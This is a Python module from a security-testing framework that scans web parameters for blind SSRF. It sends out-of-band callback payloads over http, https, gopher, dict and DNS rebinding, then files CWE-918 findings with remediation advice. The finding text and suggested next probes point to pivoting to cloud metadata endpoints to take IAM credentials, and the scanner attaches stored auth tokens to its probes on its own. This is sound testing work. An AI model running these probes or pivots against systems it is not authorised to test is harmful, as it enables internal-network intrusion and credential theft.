"""`scan_blind_ssrf` — focused blind SSRF specialist
(workitem.md Phase 4.5).

Closes the blind half of OWASP A10:2021 / CWE-918. Phase 2.1
`scan_ssrf` already supports OOB-DNS callback probes via
`enable_oob=True` (default), but its in-band probe set runs first
and the OOB probe only fires when in-band misses.

This specialist is the **OOB-FIRST** counterpart for cases where
the lead has strong reason to believe SSRF exists but in-band
scanning won't catch it (e.g. a webhook / image-proxy that doesn't
echo response bodies, only emits status codes). Probes are pure
OOB — no in-band fingerprint comparison — so a hit is the only
signal.

Comparison vs. `scan_ssrf`:

  * `scan_ssrf` — tries in-band first (cloud metadata fingerprints,
    /etc/passwd via file://, loopback default pages); falls back to
    OOB if no in-band match.
  * `scan_blind_ssrf` — pure OOB. Send N probes per param, each
    embedding a unique callback URL. Hit = SSRF. Faster + cleaner
    when the target is known to be blind.

Probe families
--------------

For each candidate URL/host-shaped param:

  1. **HTTP callback** — `?url=<oob-callback>` direct.
  2. **HTTPS callback** — `?url=https://<oob-host>/<token>`.
  3. **gopher://** — `?url=gopher://<oob-host>:80/_GET /<token>`
     (some libcurl-based fetchers honour this).
  4. **dict://** — `?url=dict://<oob-host>:11211/stat` (memcache
     proxy probes).
  5. **DNS rebinding** — when `STRIX_OOB_REBIND_HOST` is set, also
     send `?url=http://<rebind-host>` to test resolved-IP
     allowlists.

Auto-emits CWE-918 finding on hit. Severity: high (blind SSRF =
internal-network probing; severity escalates to critical when the
fetched URL is known to be cloud-metadata-shaped). Depends on Phase
1.3 OOB-DNS infra.
"""

from __future__ import annotations

import logging
import os
from typing import Any
from urllib.parse import urlparse

from strix.tools.specialist.registry import register_specialist_tool
from strix.tools.specialist.result import (
    FindingDraft,
    SpecialistResult,
)


logger = logging.getLogger(__name__)


_DEFAULT_LEXICON: frozenset[str] = frozenset({
    "url", "target", "uri", "image", "img", "src", "callback",
    "webhook", "redirect", "redirect_to", "dest", "destination",
    "host", "endpoint", "proxy", "fetch", "load", "feed",
    "u", "to", "next", "return", "continue", "data",
})


def _build_url_with_param(
    url: str, param_name: str, value: str,
) -> str:
    from urllib.parse import parse_qs, urlencode, urlunparse

    parts = urlparse(url)
    qs = parse_qs(parts.query, keep_blank_values=True)
    flat = {k: (v[0] if v else "") for k, v in qs.items()}
    flat[param_name] = value
    return urlunparse(
        parts._replace(query=urlencode(flat, doseq=False)),
    )


def _scheme_variants(callback_url: str, token: str) -> list[tuple[str, str]]:
    """Build (label, value) pairs of scheme-variant payloads."""
    parsed = urlparse(callback_url)
    host = parsed.netloc or parsed.path
    out: list[tuple[str, str]] = [
        ("http", callback_url),
    ]
    # gopher://<host>/_GET /<token>
    out.append(("gopher", f"gopher://{host}/_GET%20/{token}"))
    # dict://<host>:11211/stat
    out.append(("dict", f"dict://{host}:11211/stat"))
    # https variant when scheme isn't already https
    if not callback_url.lower().startswith("https://"):
        # Best-effort upgrade — will only succeed if OOB backend
        # accepts HTTPS connections; else just creates a second
        # confirming probe.
        https_url = "https://" + callback_url.split("://", 1)[1]
        out.append(("https", https_url))
    rebind = os.environ.get("STRIX_OOB_REBIND_HOST")
    if rebind:
        out.append(("rebind", f"http://{rebind}/{token}"))
    return out


def _emit_finding(
    *,
    url: str,
    param: str,
    payload_label: str,
    payload: str,
    callback_url: str,
    source_ip: str | None,
    raw_request_excerpt: str,
    severity: str,
) -> str | None:
    try:
        from strix.telemetry.tracer import get_global_tracer

        tracer = get_global_tracer()
        if tracer is None:
            return None
        finding_id = tracer.add_vulnerability_report(
            title=(
                f"Blind SSRF in `{param}` parameter "
                f"({payload_label}, OOB-confirmed)"
            ),
            severity=severity,
            cwe="CWE-918",
            endpoint=url,
            target=url,
            category="ssrf",
            verification_status="verified",
            confidence=0.95,
            description=(
                f"The `{param}` parameter at `{url}` accepts a URL "
                f"and fetches it server-side without validating the "
                f"destination. Probe `{payload_label}` (`{payload}`) "
                f"caused the server to issue a request to our OOB "
                f"callback `{callback_url}` from source IP "
                f"`{source_ip or '?'}`. The endpoint is fully blind — "
                f"no response-body fingerprint visible — but the OOB "
                f"hit is direct evidence of SSRF."
            ),
            impact=(
                "Blind SSRF. The server issues attacker-controlled "
                "requests but doesn't return the fetched content. "
                "Concrete impacts:\n"
                "  * Internal network reconnaissance — port-scan + "
                "    service fingerprinting on the parser host's LAN.\n"
                "  * IP-allowlist bypass — hit third-party services "
                "    that trust the parser-host IP.\n"
                "  * DDoS amplification — abuse the server as a "
                "    request-forwarder.\n"
                "  * Cloud-metadata exfiltration — chain with "
                "    response-shape leak (timing / status code "
                "    differences) to extract IAM credentials.\n"
                "  * gopher:// / dict:// — when the parser supports "
                "    these schemes, full TCP-protocol smuggling "
                "    becomes possible (Redis CONFIG SET, memcache "
                "    eviction, SMTP injection)."
            ),
            technical_analysis=(
                f"Endpoint: {url}\n"
                f"Param: {param}\n"
                f"Probe: {payload_label}\n"
                f"Payload: {payload}\n"
                f"OOB callback URL: {callback_url}\n"
                f"Callback hit from: {source_ip or '?'}\n"
                f"Raw OOB request excerpt:\n"
                f"{raw_request_excerpt[:1500]}"
            ),
            poc_description=(
                f"1. Send GET {url} with `{param}` set to "
                f"`{payload}`.\n"
                f"2. Server fetches our callback URL — OOB service "
                f"logs the inbound request from the target host.\n"
                f"3. Pivot to internal SSRF: replace the OOB URL "
                f"with `http://169.254.169.254/latest/meta-data/` "
                f"(AWS), `http://metadata.google.internal/` (GCP), "
                f"or internal admin-panel URLs."
            ),
            poc_script_code=(
                f"curl -sS -G '{url}' --data-urlencode '{param}={payload}'"
            ),
            remediation_steps=(
                "1. Implement an allowlist of permitted destination "
                "hosts/protocols. Reject anything not on the list, "
                "INCLUDING:\n"
                "     * private IPs (RFC1918): 10/8, 172.16/12, "
                "192.168/16\n"
                "     * link-local: 169.254.0.0/16\n"
                "     * loopback: 127.0.0.0/8, ::1\n"
                "     * non-HTTP schemes: file://, gopher://, dict://, "
                "ldap://, jar://, ftp://\n"
                "2. Resolve hostname AHEAD of fetch and validate the "
                "resolved IP isn't in a private range (defeats DNS "
                "rebinding when paired with re-validation after "
                "connect).\n"
                "3. For cloud metadata specifically — block "
                "`169.254.169.254` and `metadata.google.internal` at "
                "BOTH the egress firewall AND the application layer.\n"
                "4. Use IMDSv2 (token-required) on AWS so even when "
                "SSRF triggers, credential theft is blocked."
            ),
            cvss_breakdown={
                "AV": "N", "AC": "L", "PR": "N", "UI": "N",
                "S": "C", "C": "L", "I": "L", "A": "N",
            },
            reasoning_trace=[
                f"Probed {param}= with blind-SSRF payload "
                f"`{payload_label}`.",
                f"Embedded callback URL: {callback_url}.",
                f"OOB service received inbound from {source_ip}.",
                "Server fetches attacker-controlled URLs blindly.",
            ],
        )
        try:
            from strix.agents.kg_emit import record_finding_in_kg
            record_finding_in_kg(
                finding_id=finding_id, url=url, param=param,
                cwe="CWE-918", severity=severity, category="ssrf",
                method="GET", detection_kind=f"oob_{payload_label[:50]}",
                confidence=0.95,
            )
        except Exception as e:  # noqa: BLE001
            logger.debug("scan_blind_ssrf: kg record failed: %s", e, exc_info=True)
        return finding_id
    except Exception as e:  # noqa: BLE001
        logger.debug("scan_blind_ssrf: emit failed: %s", e, exc_info=True)
        return None


@register_specialist_tool(
    category="ssrf-specialist",
    llm=False,
    default_budget={"cost_usd": 0.0, "max_wall_seconds": 90},
    sandbox_execution=False,
    provenance="framework",
    mitre_techniques=["T1190"],
)
def scan_blind_ssrf(
    *,
    url: str,
    params: list[str] | str | None = None,
    param: str | None = None,
    extra_headers: dict[str, str] | None = None,
    oob_timeout_seconds: float = 6.0,
) -> SpecialistResult:
    """Blind SSRF scanner. OOB-first (no in-band probes — see
    `scan_ssrf` for the in-band variant). Sends multiple scheme
    variants per param, each embedding a unique OOB callback URL;
    emits a CWE-918 finding when the OOB service receives a hit.

    Args:
        url: target URL.
        params: param names to probe. When None, scanner infers from
            URL query keys + SSRF lexicon (url/target/webhook/...).
        param: convenience alias for a single param name.
        extra_headers: forwarded as-is.
        oob_timeout_seconds: how long to wait per probe for OOB hit.

    Returns:
        SpecialistResult. status=partial when OOB-DNS is unavailable.
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    # OOB precondition.
    try:
        from strix.tools.oob import (
            backend_name as oob_backend_name,
            is_available as oob_is_available,
            poll_callback,
            register_callback,
        )
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"OOB module unavailable: {type(e).__name__}: {e}",
        )

    if not oob_is_available():
        return SpecialistResult(
            status="partial",
            error=(
                "OOB-DNS backend not available — Phase 1.3 prerequisite. "
                "Set STRIX_OOB_BACKEND=local or interactsh."
            ),
            evidence=[f"backend: {oob_backend_name()}"],
            next_probes_suggested=[
                "scan_ssrf (Phase 2.1) covers in-band SSRF without "
                "requiring OOB; deploy OOB-DNS infra (Phase 1.3) for "
                "blind variants"
            ],
        )

    # Forgiving args.
    if param and not params:
        params = [param]
    if isinstance(params, str):
        params = [params]

    parsed = urlparse(url)
    if not params:
        from urllib.parse import parse_qs
        qs_keys = list(parse_qs(parsed.query).keys())
        params = [k for k in qs_keys if k.lower() in _DEFAULT_LEXICON]
        if not params:
            params = qs_keys
    if not params:
        return SpecialistResult(
            status="partial",
            error="no SSRF-shaped params found",
        )

    # Auth auto-injection.
    extra_headers = dict(extra_headers or {})
    if "Authorization" not in extra_headers and "authorization" not in {
        h.lower() for h in extra_headers
    }:
        try:
            from strix.agents.security_context import list_auth_states
            for state in list_auth_states():
                if state.bearer:
                    extra_headers["Authorization"] = f"Bearer {state.bearer}"
                    break
                if state.cookies:
                    extra_headers["Cookie"] = "; ".join(
                        f"{k}={v}" for k, v in state.cookies.items()
                    )
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager
        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    probe_count = 0
    seen_endpoint_param: set[tuple[str, str]] = set()

    for raw_param in params:
        if not isinstance(raw_param, str) or not raw_param.strip():
            continue
        p = raw_param.strip()
        key = (parsed.path or "/", p)
        if key in seen_endpoint_param:
            continue

        # Register a single callback per param; iterate scheme
        # variants. Same token = any hit attributable.
        cb = register_callback(ttl_seconds=int(oob_timeout_seconds * 6))
        if cb is None:
            evidence.append(f"{p}: register_callback returned None")
            continue

        for scheme_label, payload in _scheme_variants(cb.callback_url, cb.token):
            probe_url = _build_url_with_param(url, p, payload)
            try:
                pm.send_simple_request(
                    "GET", probe_url,
                    headers=extra_headers, body="", timeout=15,
                )
                probe_count += 1
            except Exception as e:  # noqa: BLE001
                evidence.append(f"{p}/{scheme_label}: transport error: {e}")
                continue

        # Single poll covering all scheme variants — the listener
        # records hits keyed by token; any variant could fire.
        result = poll_callback(cb.token, timeout_seconds=oob_timeout_seconds)
        if not result.get("hit"):
            evidence.append(f"{p}: no OOB hit across scheme variants")
            continue

        seen_endpoint_param.add(key)
        # Severity: high by default; critical when the source IP is
        # private (the parser is on the internal network → SSRF
        # lateral-movement risk explicit).
        src = result.get("source_ip") or ""
        is_private = (
            src.startswith("10.") or src.startswith("172.16.")
            or src.startswith("192.168.") or src.startswith("127.")
        )
        severity = "critical" if is_private else "high"

        rid = _emit_finding(
            url=url, param=p,
            payload_label="oob_callback",
            payload=cb.callback_url,
            callback_url=cb.callback_url,
            source_ip=src,
            raw_request_excerpt=str(result.get("raw_request") or ""),
            severity=severity,
        )
        if rid:
            emitted_count += 1
        drafts.append(FindingDraft(
            title=f"Blind SSRF in `{p}` (OOB-confirmed)",
            severity=severity, cwe="CWE-918",
            endpoint=url, category="ssrf",
            verification_status="verified", confidence=0.95,
            description=(
                f"OOB hit from {src or '?'} (token {cb.token})"
            ),
        ))
        evidence.append(
            f"{p}: OOB hit from {src or '?'} (token {cb.token})"
        )

    # SecurityContext + decision_log
    try:
        from strix.agents.security_context import record_endpoint
        record_endpoint(url, method="GET", params=params, probed_for="blind_ssrf")
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision
        record_decision(
            kind="specialist_invocation", target=url,
            actor={"tool_name": "scan_blind_ssrf"},
            input={
                "params": list(params),
                "oob_backend": oob_backend_name(),
                "probes_sent": probe_count,
            },
            output={
                "findings_emitted": emitted_count,
                "drafts": len(drafts),
            },
        )
    except Exception:  # noqa: BLE001
        pass

    return SpecialistResult(
        status="ok",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=(
            ["pivot to cloud-metadata exfil (AWS IMDSv1, GCP, Azure) "
             "and internal admin panel discovery; chain with status-"
             "code timing leak for response shape"]
            if drafts else
            ["no blind SSRF on listed params; consider POST/JSON body "
             "fields with URL-shaped values, header-based fetchers "
             "(Webhook-URL, X-Forwarded-Host)"]
        ),
        tool_metadata={
            "probes_sent": probe_count,
            "params_probed": len(params),
            "oob_backend": oob_backend_name(),
            "findings_emitted_to_tracer": emitted_count,
        },
    )
